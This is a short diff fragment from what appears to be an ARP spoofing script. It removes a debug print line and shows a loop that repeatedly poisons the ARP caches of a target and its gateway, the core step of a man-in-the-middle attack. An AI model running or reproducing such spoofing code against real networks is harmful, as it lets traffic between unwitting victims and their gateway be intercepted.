@@ -28,6 +28,3 @@ def main(target_ip, gateway_ip):
     while True:
         spoof_arp_cache(target_ip, target_mac, gateway_ip)
         spoof_arp_cache(gateway_ip, gateway_mac, target_ip)
-
-
-print(get_mac("10.0.0.18"))
